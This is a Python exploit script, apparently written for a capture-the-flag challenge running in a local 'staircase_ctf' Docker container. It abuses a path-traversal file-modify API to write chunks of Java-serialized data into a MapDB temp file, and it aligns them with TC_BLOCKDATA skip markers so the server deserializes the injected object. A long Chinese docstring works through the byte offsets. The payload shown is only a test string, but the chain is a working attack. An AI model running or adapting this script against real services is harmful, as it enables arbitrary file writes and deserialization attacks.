#!/usr/bin/env python3
"""
修正版：TC_BLOCKDATA 长度应该是 14 (0x0E)
跳过: 2 bytes (chunk padding) + 5 bytes (<end>) + 7 bytes (<start>) = 14 bytes
"""
import requests
import base64
import subprocess
import time
import struct

def restart_container():
    subprocess.run("docker stop staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker rm staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker run -d --name staircase_ctf -p 8080:8080 staircase:latest", shell=True, capture_output=True)
    time.sleep(5)

def get_mapdb_name():
    result = subprocess.run('docker exec staircase_ctf sh -c "ls /tmp/mapdb*temp | head -1"', 
                           shell=True, capture_output=True, text=True)
    return result.stdout.strip().split('/')[-1]

def write_chunk(mapdb_name, offset, data):
    url = 'http://localhost:8080'
    mapdb_path = f"../../../tmp/{mapdb_name}"
    
    if len(data) > 8:
        raise ValueError("Data too long")
    
    payload = {
        'fileName': mapdb_path,
        'data': base64.b64encode(data).decode(),
        'offset': offset
    }
    
    return requests.put(f'{url}/files/modify', json=payload, timeout=5)


def build_blockdata_chain_v2(raw_payload):
    """
    修正版：跳过 14 bytes
    
    每次写入: <start>(7) + DATA(8) + <end>(5) = 20 bytes
    DATA 布局: [payload_bytes(6)] + [77 0E](2) = 8 bytes
    
    77 0E = TC_BLOCKDATA skip 14 bytes
    需要跳过: 2 bytes (chunk末尾) + 5 bytes (<end>) + 7 bytes (<start>) = 14 bytes
    
    但等等...让我重新计算
    
    chunk N at offset X:
      X+0 to X+6:  <start> (7 bytes)
      X+7 to X+14: DATA (8 bytes) = [6 payload] + [77 0E]
      X+15 to X+19: <end> (5 bytes)
    
    chunk N+1 at offset X+20:
      X+20 to X+26: <start> (7 bytes)  
      X+27 to X+34: DATA (8 bytes)
      ...
    
    从 77 0E 开始：位置是 X+13, X+14
    77 0E 后跳过 14 bytes：X+15 到 X+28 被跳过
    下一个有效字节在 X+29...
    
    但 chunk N+1 的 DATA 从 X+27 开始！
    
    所以跳过 14 bytes 后：
    X+15 = <end> 开始
    X+19 = <end> 结束
    X+20 = <start> 开始 (chunk N+1)
    X+26 = <start> 结束
    X+27 = DATA 开始 (chunk N+1)
    X+28 = DATA 第二字节
    
    X+15 + 14 = X+29
    
    所以跳过 14 bytes 后，我们落在 chunk N+1 的 DATA 的第3字节！
    
    这不对...让我重新想...
    
    我们想要：跳过 <end><start>，然后下一个字节是 chunk N+1 的 DATA 开始
    
    从 77 0E 的位置 X+13 开始，跳过的是 X+15 到 X+15+13 = X+28
    不对...TC_BLOCKDATA 的语义是：跳过接下来的 N 个字节
    
    所以如果 77 0E 在位置 X+13,X+14：
    接下来 14 bytes 是 X+15 到 X+28 (14 bytes)
    
    chunk N 的 <end> 在 X+15 到 X+19 (5 bytes)
    chunk N+1 的 <start> 在 X+20 到 X+26 (7 bytes)
    chunk N+1 的 DATA 在 X+27 开始
    
    X+15 到 X+28 = 14 bytes
    这正好覆盖: <end>(5) + <start>(7) + DATA前2字节(2) = 14
    
    所以跳过后，下一个有效字节是 X+29，即 DATA 的第3字节
    这不是我们想要的！
    
    我们需要跳过 <end> + <start> = 12 bytes
    但 77 后面能放的数字最大是 0xFF (255)
    
    让我重新布局：
    DATA(8) = [4 payload] + [filler(2)] + [77 0C](2)
    
    不对，这样就只有 4 bytes 有效载荷了...
    
    正确的布局应该是：
    DATA(8) = [payload(6)] + [77](1) + [XX](1)
    其中 77 XX 需要跳过 <end>(5) + <start>(7) = 12 bytes
    所以 XX = 0x0C
    
    等等，77 0C 本身占 2 bytes，是 DATA 的最后 2 bytes
    从 77 0C 后开始跳过 12 bytes...
    
    chunk N:
      offset X+0 to X+6: <start> (7)
      offset X+7 to X+14: DATA (8) = [payload(6)] + [77 0C](2)
      offset X+15 to X+19: <end> (5)
    
    chunk N+1:
      offset X+20 to X+26: <start> (7)
      offset X+27 to X+34: DATA (8)
    
    77 0C 在 offset X+13, X+14 (相对于 DATA 开始是 +6, +7)
    TC_BLOCKDATA 77 0C 表示接下来 12 bytes 是原始数据
    
    接下来 12 bytes: X+15 到 X+26
    X+15 to X+19: <end> (5 bytes)
    X+20 to X+26: <start> (7 bytes)
    
    5 + 7 = 12 ✓
    
    所以跳过后下一个字节是 X+27，正好是 chunk N+1 的 DATA 开始！
    
    但是...为什么我的测试失败了？
    
    哦！问题是第一个 chunk！
    
    第一个 chunk:
      offset BASE+0 to BASE+6: <start>
      offset BASE+7 to BASE+14: AC ED 00 05 77 0C XX XX
      offset BASE+15 to BASE+19: <end>
    
    77 0C 在 BASE+11, BASE+12
    跳过 12 bytes: BASE+13 to BASE+24
    
    但 chunk 2 的 DATA 从 BASE+27 开始...
    
    BASE+13 to BASE+24 = 12 bytes
    BASE+25, BASE+26 是 chunk 2 的 <start> 的一部分
    
    等等让我算清楚：
    chunk 1: BASE+0 到 BASE+19 (20 bytes)
      <start>: BASE+0 到 BASE+6 (7 bytes)
      DATA: BASE+7 到 BASE+14 (8 bytes)
      <end>: BASE+15 到 BASE+19 (5 bytes)
    
    chunk 2: BASE+20 到 BASE+39 (20 bytes)
      <start>: BASE+20 到 BASE+26 (7 bytes)
      DATA: BASE+27 到 BASE+34 (8 bytes)
      <end>: BASE+35 到 BASE+39 (5 bytes)
    
    chunk 1 的 DATA = AC ED 00 05 77 0C XX XX
    77 0C 在 BASE+11, BASE+12 (相对于 chunk 1 开始)
    或者说 77 0C 在 BASE+7+4, BASE+7+5 = BASE+11, BASE+12
    
    TC_BLOCKDATA 跳过 12 bytes，从 BASE+13 开始
    BASE+13, BASE+14: XX XX (chunk 1 DATA 末尾)
    BASE+15 到 BASE+19: <end> (5 bytes)
    BASE+20 到 BASE+26: <start> (7 bytes)
    
    等等 2 + 5 + 7 = 14 bytes，不是 12！
    
    所以第一个 chunk 需要 77 0E (14)？但后面的 chunks 需要 77 0C (12)？
    
    不对...让我重新看：
    
    DATA 是 8 bytes: [AC ED 00 05 77 0C] + [XX XX]
    这里 77 0C 在 DATA 的第5和第6字节
    XX XX 在 DATA 的第7和第8字节
    
    77 0C 之后要跳过的是：
    - DATA 剩余：XX XX (2 bytes)
    - <end>: 5 bytes
    - <start>: 7 bytes
    总共 2 + 5 + 7 = 14 bytes
    
    所以应该用 77 0E！
    """
    chunks = []
    
    # 第一块: AC ED 00 05 77 0E XX XX
    # 77 0E 跳过 14 bytes: XX XX (2) + <end> (5) + <start> (7) = 14
    first_chunk = b'\xac\xed\x00\x05\x77\x0e\x00\x00'
    chunks.append(first_chunk)
    
    # 后续块: [6 payload] + [77 0E]
    remaining = raw_payload[4:]  # 跳过 stream header
    
    i = 0
    while i < len(remaining):
        chunk_data = remaining[i:i+6]
        if len(chunk_data) < 6:
            chunk_data = chunk_data + b'\x00' * (6 - len(chunk_data))
        
        if i + 6 < len(remaining):
            chunk = chunk_data + b'\x77\x0e'
        else:
            # 最后一块不需要跳过
            chunk = chunk_data + b'\x00\x00'
        
        chunks.append(chunk)
        i += 6
    
    return chunks


def create_simple_string_payload():
    """TC_STRING "test" """
    payload = b'\xac\xed\x00\x05'
    payload += b'\x74'  # TC_STRING
    payload += struct.pack('>H', 4)
    payload += b'test'
    return payload


def main():
    print("Restarting container...")
    restart_container()
    mapdb_name = get_mapdb_name()
    print(f"MapDB: {mapdb_name}")
    
    raw_payload = create_simple_string_payload()
    print(f"\nRaw payload: {raw_payload.hex()}")
    print(f"Size: {len(raw_payload)} bytes")
    
    chunks = build_blockdata_chain_v2(raw_payload)
    print(f"\nChunks ({len(chunks)}):")
    for i, chunk in enumerate(chunks):
        print(f"  {i}: {chunk.hex()}")
    
    print("\nWriting chunks...")
    base_offset = 0x100249
    
    for i, chunk in enumerate(chunks):
        offset = base_offset + i * 20
        resp = write_chunk(mapdb_name, offset, chunk)
        print(f"  Chunk {i} at 0x{offset:x}: {resp.status_code}")
    
    print("\nChecking icon...")
    resp = requests.get('http://localhost:8080/files/icon', timeout=5)
    print(f"Status: {resp.status_code}")
    
    if resp.status_code == 200:
        print(f"Response body length: {len(resp.content)}")
        print(f"Response body (first 100 bytes): {resp.content[:100]}")
    
    result = subprocess.run('docker logs --tail 15 staircase_ctf 2>&1', 
                           shell=True, capture_output=True, text=True)
    print(f"\nLogs:\n{result.stdout[-800:]}")

if __name__ == "__main__":
    main()
